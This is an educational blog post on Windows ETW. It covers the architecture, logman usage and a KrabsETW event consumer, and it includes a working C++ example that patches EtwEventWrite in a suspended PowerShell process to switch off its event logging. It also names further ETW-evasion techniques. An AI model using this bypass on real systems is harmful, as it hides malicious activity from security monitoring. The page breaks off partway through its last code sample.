<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Detailed Guide to Getting Started with Windows ETW | Just a Blog by Sharkkcode ... 紀錄，也是一種享受生活的方式 XD</title><meta name="keywords" content="Windows,ETW"><meta name="author" content="Sharkkcode"><meta name="copyright" content="Sharkkcode"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Detailed Guide to Getting Started with Windows ETW  Disclaimer: The following content is based on information from the internet and some of my own notes, aimed at a more comprehensive study and record">
<meta property="og:type" content="article">
<meta property="og:title" content="Detailed Guide to Getting Started with Windows ETW">
<meta property="og:url" content="https://sharkkcode.github.io/2024/07/07/Detailed-Guide-to-Getting-Started-with-Windows-ETW/index.html">
<meta property="og:site_name" content="Just a Blog by Sharkkcode ... 紀錄，也是一種享受生活的方式 XD">
<meta property="og:description" content="Detailed Guide to Getting Started with Windows ETW  Disclaimer: The following content is based on information from the internet and some of my own notes, aimed at a more comprehensive study and record">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://sharkkcode.github.io/img/wall.jpg">
<meta property="article:published_time" content="2024-07-07T09:27:28.000Z">
<meta property="article:modified_time" content="2024-07-07T09:35:32.000Z">
<meta property="article:author" content="Sharkkcode">
<meta property="article:tag" content="Windows">
<meta property="article:tag" content="ETW">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sharkkcode.github.io/img/wall.jpg"><link rel="shortcut icon" href="/img/fishingcat.jpg"><link rel="canonical" href="https://sharkkcode.github.io/2024/07/07/Detailed-Guide-to-Getting-Started-with-Windows-ETW/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Detailed Guide to Getting Started with Windows ETW',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-07-07 17:35:32'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2445008510937449" crossorigin="anonymous"></script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/fishingcat.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">40</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="https://sharkkcode.github.io/2022/07/08/About-Sharkkcode/"><span> About</span></a></div><div class="menus_item"><a class="site-page" href="https://sharkkcode.github.io/2022/09/14/Portfolio/"><span> Portfolio</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/wall.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Just a Blog by Sharkkcode ... 紀錄，也是一種享受生活的方式 XD</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="https://sharkkcode.github.io/2022/07/08/About-Sharkkcode/"><span> About</span></a></div><div class="menus_item"><a class="site-page" href="https://sharkkcode.github.io/2022/09/14/Portfolio/"><span> Portfolio</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Detailed Guide to Getting Started with Windows ETW</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-07-07T09:27:28.000Z" title="Created 2024-07-07 17:27:28">2024-07-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-07-07T09:35:32.000Z" title="Updated 2024-07-07 17:35:32">2024-07-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Information-Security/">Information Security</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Detailed Guide to Getting Started with Windows ETW"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="detailed-guide-to-getting-started-with-windows-etw">Detailed Guide to Getting Started with Windows ETW</h1>
<blockquote>
<p><strong>Disclaimer</strong>: The following content is based on information from the internet and some of my own notes, aimed at a more comprehensive study and recording of ETW-related knowledge.</p>
</blockquote>
<h2 id="environment">Environment</h2>
<ul>
<li><strong>Operating System</strong>: Windows 10 21H1</li>
</ul>
<h2 id="introduction-to-etw">Introduction to ETW</h2>
<h3 id="history">History</h3>
<p>ETW (Event Tracing for Windows) was first introduced in Windows 2000, after which the operating system core and services began using ETW to log events. After Windows Vista, ETW introduced a unified event provider model and API, and it was further enhanced in Windows 7.</p>
<p>Due to ETW's functional and performance advantages, third-party logging systems gradually lost their edge. Advantages of ETW include:</p>
<ol type="1">
<li><p><strong>Separation of process and ETW session</strong>: Application crashes do not affect ETW. This is because ETW uses separate system resources and mechanisms to log events, ensuring that ETW can operate normally even if the application crashes.</p></li>
<li><p><strong>Dynamic enable and disable logging</strong>: Can be adjusted at runtime. This means users can enable or disable specific logging at any time based on their needs. For example, when the system encounters an anomaly, administrators can immediately enable more logging to facilitate detailed troubleshooting.</p></li>
<li><p><strong>Low resource consumption</strong>: Almost no system resources are consumed when event tracking is turned off. This is because ETW is in an idle state without logging enabled, not occupying CPU or memory resources.</p></li>
<li><p><strong>Custom message format</strong>: Easy to extend. For example, developers can define their own event types and data formats to log specific application or system operations, making ETW adaptable to different needs and scenarios.</p></li>
</ol>
<h3 id="operating-mechanism">Operating Mechanism</h3>
<p>The operation of ETW mainly consists of five important roles and components: <strong>Provider</strong> , <strong>Session</strong> , <strong>Controller</strong> , <strong>Consumer</strong> , and <strong>Buffer</strong> .</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;"><img src="https://raw.githubusercontent.com/Sharkkcode/Sharkkcode.github.io/main/img/WindowsETW/ww1.png" /></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-hardware/test/weg/images/weg-diagram-etw-architecture-four-components.png">Link</a></td>
</tr>
</tbody>
</table>
<p>A <strong>provider</strong> is an instrumented component used to generate events. Providers can be user-mode applications, kernel-mode drivers, or the Windows kernel itself. In addition to fixed event data (headers), events can also carry user data.</p>
<ul>
<li><p><strong>Events</strong> are <strong>data representations based on occurrences</strong> . Data can be used for in-depth analysis. Events can also be used to <strong>generate counters</strong> . <strong>Counters</strong> provide a <strong>sample-based view of data</strong> , usually containing a small set of data to show the current state, such as the number of I/O bytes per second and the number of interrupts per second.</p></li>
<li><p>Providers must <strong>register with ETW</strong> and <strong>send events by calling the ETW Logging API</strong> . Providers register a callback function to receive enable and disable notifications, allowing for dynamic enabling and disabling of tracking.</p></li>
</ul>
<p>A <strong>session</strong> acts as an <strong>intermediary agent</strong> in the ETW infrastructure, <strong>forwarding events from one or more providers to consumers</strong> . A session is a <strong>kernel object that collects events into kernel buffers and sends them to specified files or real-time consumer programs</strong> . <strong>Multiple providers can be mapped to a single session</strong> , allowing users to collect data from multiple sources.</p>
<p><strong>Controllers</strong> are responsible for <strong>starting</strong> , <strong>stopping</strong> , or updating a tracing session. A session is a unit of tracing. Providers are mapped (or enabled) to specific sessions. Controllers enable and disable providers, allowing them to start sending events to ETW. Controller functionality can be invoked through Microsoft-provided tools or custom applications.</p>
<ul>
<li><p><code>Logman.exe</code> is a built-in controller application.</p></li>
<li><p>Windows Performance Recorder (WPR) is a recommended controller process in the Windows performance toolkit.</p></li>
</ul>
<p><strong>Consumers</strong> are applications that read recorded trace files (ETL files) or capture events in real-time from active tracing sessions and process the events. Event Viewer and Resource Monitor are built-in ETW consumer applications.</p>
<ul>
<li>Windows Performance Analyzer (WPA) is a recommended consumer process in the Windows performance toolkit.</li>
</ul>
<p><strong>Buffers</strong> are an important part of an ETW session, used to temporarily store event data. When event data is generated by providers, it is first stored in buffers and then transmitted by the session to specified files or real-time consumer programs. Buffers ensure stable and efficient data transmission.</p>
<h3 id="practical-uses">Practical Uses</h3>
<p><strong>Blue Team Applications</strong></p>
<ul>
<li>The Blue Team can utilize ETW's callback mechanism to passively and instantly receive events. For example, the Microsoft-Windows-Threat-Intelligence provider is an event provider that can monitor AllocationType events, RegionSizes events, ProtectionMask events, and other information. These parameters are as follows:
<ul>
<li><code>AllocationType</code> : Indicates the type of memory allocation.</li>
<li><code>RegionSizes</code> : Indicates the size of the memory region.</li>
<li><code>ProtectionMask</code> : Indicates the protection attributes of the memory region, such as readable, writable, and executable.</li>
</ul></li>
<li>If a memory region is found to have readable, writable, and executable attributes, it may be the behavior of malicious software. Additionally, the Blue Team can use the Microsoft-Windows-Kernel-Registry provider to monitor persistence behaviors implemented through the registry, such as writing to the following registry keys:
<ul>
<li><strong>Registry</strong> : The registry is a <strong>centralized database</strong> in the Windows operating system used to store <strong>configuration information</strong> , <strong>application settings</strong> , and <strong>system options</strong> . It allows applications and the operating system to share information, ensuring system stability and consistency.</li>
<li><code>RunOnce</code> : Programs run only once at the next system startup.</li>
<li><code>Run</code> : Programs run every time the system starts.</li>
<li><code>RunServices</code> : Services run every time the system starts.</li>
</ul></li>
</ul>
<p><strong>Red Team Applications</strong></p>
<ul>
<li><p>The Red Team also has corresponding countermeasures to <strong>bypass ETW</strong> . In user mode (Ring3), the EtwEventWrite function can be hooked to intercept event writing, or EtwEventUnregister can be used to unregister ETW events. In kernel mode (Ring0), the GITL (Ghost In The Logs) method can be used to bypass ETW by hooking the kernel API NtTraceEvent.</p>
<ul>
<li><p>In computer architecture, the Ring model divides system operation permissions into different levels, with Ring0 having the highest permissions, usually running kernel-mode code; Ring3 has the lowest permissions, running user-mode code. This design protects the system from damage by low-permission code.</p></li>
<li><p>Ghost In The Logs is a technique to bypass ETW by hooking (intercepting and modifying) the kernel API NtTraceEvent, so that specific events are not logged or modified, thereby hiding malicious activities.</p></li>
<li><p>Bypassing here refers to using technical means to make certain operations not be logged or monitored normally, thereby hiding behaviors. For example, malicious software bypasses ETW monitoring during execution, making its behavior undetected by the security system.</p></li>
</ul></li>
</ul>
<table>
<colgroup>
<col style="width: 35%" />
<col style="width: 64%" />
</colgroup>
<thead>
<tr class="header">
<th>Blue Team Applications</th>
<th>Red Team Applications</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Utilize ETW's callback mechanism to passively and instantly receive events</td>
<td>Hook the EtwEventWrite function to intercept event writing, or use EtwEventUnregister to unregister ETW events</td>
</tr>
<tr class="even">
<td>Use Microsoft-Windows-Threat-Intelligence provider to monitor memory allocation, region sizes, and protection attributes</td>
<td>Use the GITL (Ghost In The Logs) method by hooking the kernel API NtTraceEvent to bypass ETW</td>
</tr>
<tr class="odd">
<td>Use Microsoft-Windows-Kernel-Registry provider to monitor changes to registry keys</td>
<td></td>
</tr>
</tbody>
</table>
<h2 id="etw-tools">ETW Tools</h2>
<h3 id="introduction">Introduction</h3>
<p>Windows provides a built-in tool - Logman, used to view provider information and session status, and create sessions to receive events.</p>
<h3 id="usage">Usage</h3>
<p>View All Providers</p>
<ul>
<li>Use the command <code>logman query providers</code> to view all providers. The output will display the provider names and GUIDs.</li>
</ul>
<p>View Specific Provider</p>
<ul>
<li>To find out the details of a specific provider, add the provider name or GUID after the command, such as <code>logman query providers &lt;provider name&gt;</code> or <code>logman query providers &lt;GUID&gt;</code>. The return result will display the provider's event flags and security level information.</li>
</ul>
<p>Using Sessions</p>
<ul>
<li>Create a session: <code>logman create trace &lt;session name&gt; -p &lt;provider name / GUID&gt; &lt;flags&gt; &lt;security level&gt; -o &lt;path to log file&gt;</code></li>
<li>Start a session: <code>logman start &lt;session name&gt;</code></li>
<li>Stop a session: <code>logman stop &lt;session name&gt;</code></li>
<li>Delete a session: <code>logman delete &lt;session name&gt;</code></li>
</ul>
<p>For example, create a session using the Microsoft-Windows-Kernel-Process provider:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">logman create trace example <span class="literal">-p</span> Microsoft<span class="literal">-Windows-Kernel-Process</span> <span class="number">0</span>x10 <span class="number">0</span>x4 <span class="literal">-o</span> C:\example.etl</span><br><span class="line">logman <span class="built_in">start</span> example</span><br><span class="line">logman stop example</span><br><span class="line">logman delete example</span><br></pre></td></tr></table></figure>
<p>The generated ETL file can be converted to an XML file using tracerpt :</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tracerpt example.etl <span class="literal">-o</span> example.xml</span><br></pre></td></tr></table></figure>
<p>Open the XML file, and you should see the event records generated by the previously executed commands.</p>
<h2 id="example-of-capturing-and-analyzing-events-using-krabsetw-and-json-libraries">Example of Capturing and Analyzing Events Using KrabsETW and JSON Libraries</h2>
<p>Below is an example program using KrabsETW and JSON libraries to capture and analyze events:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;krabs.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;nlohmann/json.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Convert wstring to string</span></span><br><span class="line"><span class="function">std::string <span class="title">ws2s</span><span class="params">(<span class="type">const</span> std::wstring&amp; wstr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> std::<span class="built_in">string</span>(wstr.<span class="built_in">begin</span>(), wstr.<span class="built_in">end</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Convert byte vector to uint32</span></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">byte2uint32</span><span class="params">(std::vector&lt;BYTE&gt; v)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = (<span class="type">int</span>)v.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        res &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">        res += (<span class="type">uint32_t</span>)v[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Convert byte vector to uint64</span></span><br><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">byte2uint64</span><span class="params">(std::vector&lt;BYTE&gt; v)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">7</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        res &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">        res += (<span class="type">uint64_t</span>)v[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Callback function when session receives an event from provider</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">callback</span><span class="params">(<span class="type">const</span> EVENT_RECORD&amp; record, <span class="type">const</span> krabs::trace_context&amp; trace_context)</span> </span>&#123;</span><br><span class="line">    <span class="function">krabs::schema <span class="title">schema</span><span class="params">(record, trace_context.schema_locator)</span></span>;</span><br><span class="line">    <span class="function">krabs::parser <span class="title">parser</span><span class="params">(schema)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (schema.<span class="built_in">event_id</span>() == <span class="number">1</span>) &#123;</span><br><span class="line">        nlohmann::json data;</span><br><span class="line">        data[<span class="string">&quot;ProcessID&quot;</span>] = <span class="built_in">byte2uint32</span>(parser.<span class="built_in">parse</span>&lt;krabs::binary&gt;(<span class="string">L&quot;ProcessID&quot;</span>).<span class="built_in">bytes</span>());</span><br><span class="line">        data[<span class="string">&quot;CreateTime&quot;</span>] = <span class="built_in">byte2uint64</span>(parser.<span class="built_in">parse</span>&lt;krabs::binary&gt;(<span class="string">L&quot;CreateTime&quot;</span>).<span class="built_in">bytes</span>());</span><br><span class="line">        data[<span class="string">&quot;ParentProcessID&quot;</span>] = <span class="built_in">byte2uint32</span>(parser.<span class="built_in">parse</span>&lt;krabs::binary&gt;(<span class="string">L&quot;ParentProcessID&quot;</span>).<span class="built_in">bytes</span>());</span><br><span class="line">        data[<span class="string">&quot;SessionID&quot;</span>] = <span class="built_in">byte2uint32</span>(parser.<span class="built_in">parse</span>&lt;krabs::binary&gt;(<span class="string">L&quot;SessionID&quot;</span>).<span class="built_in">bytes</span>());</span><br><span class="line">        data[<span class="string">&quot;ImageName&quot;</span>] = <span class="built_in">ws2s</span>(parser.<span class="built_in">parse</span>&lt;std::wstring&gt;(<span class="string">L&quot;ImageName&quot;</span>));</span><br><span class="line">        </span><br><span class="line">        std::cout &lt;&lt; data.<span class="built_in">dump</span>(<span class="number">4</span>) &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Create an ETW session</span></span><br><span class="line">    <span class="function">krabs::user_trace <span class="title">session</span><span class="params">(<span class="string">L&quot;ETW_example&quot;</span>)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Set provider</span></span><br><span class="line">    krabs::provider&lt;&gt; <span class="built_in">provider</span>(<span class="string">L&quot;Microsoft-Windows-Kernel-Process&quot;</span>);</span><br><span class="line">    provider.<span class="built_in">any</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Add event callback function</span></span><br><span class="line">    provider.<span class="built_in">add_on_event_callback</span>(callback);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Enable provider and start session</span></span><br><span class="line">    session.<span class="built_in">enable</span>(provider);</span><br><span class="line">    session.<span class="built_in">start</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>This program will create a session and receive events from the Microsoft-Windows-Kernel-Process provider, parsing and outputting them in JSON format.</p>
<h2 id="example-of-implementing-detection-bypass">Example of Implementing Detection Bypass</h2>
<p>Below is an example program of bypassing ETW detection:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Tlhelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    STARTUPINFOA si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    si.cb = <span class="built_in">sizeof</span>(si);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create a suspended PowerShell process</span></span><br><span class="line">    <span class="built_in">CreateProcessA</span>(<span class="literal">NULL</span>, (LPSTR)<span class="string">&quot;powershell -noexit&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get the address of EtwEventWrite in ntdll.dll</span></span><br><span class="line">    HMODULE hNtdll = <span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">    LPVOID pEtwEventWrite = <span class="built_in">GetProcAddress</span>(hNtdll, <span class="string">&quot;EtwEventWrite&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Change the memory protection attribute of EtwEventWrite to read/write</span></span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    <span class="built_in">VirtualProtectEx</span>(pi.hProcess, (LPVOID)pEtwEventWrite, <span class="number">1</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Modify the first byte of EtwEventWrite to ret instruction</span></span><br><span class="line">    <span class="type">char</span> patch = <span class="number">0xc3</span>;</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(pi.hProcess, (LPVOID)pEtwEventWrite, &amp;patch, <span class="built_in">sizeof</span>(<span class="type">char</span>), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Restore the memory protection attribute and continue executing the process</span></span><br><span class="line">    <span class="built_in">VirtualProtectEx</span>(pi.hProcess, (LPVOID)pEtwEventWrite, <span class="number">1</span>, oldProtect, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">ResumeThread</span>(pi.hThread);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>This program modifies the ETW behavior of PowerShell to no longer log events.</p>
<h2 id="advanced-use-real-time-event-capture-and-analysis">Advanced Use: Real-time Event Capture and Analysis</h2>
<p>Below is a more advanced example demonstrating how to capture and analyze events in real-time using ETW:</p>
<p>Preparation</p>
<ul>
<li><p>Install KrabsETW and JSON libraries</p>
<p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vcpkg.exe install nlohmann<span class="literal">-json</span>:x64<span class="literal">-windows</span></span><br><span class="line">vcpkg.exe install krabsetw:x64<span class="literal">-windows</span></span><br></pre></td></tr></table></figure></p></li>
</ul>
<p>Set Provider and Create Session</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;krabs.hpp&gt;</span></span></span><br><span class="line"><span 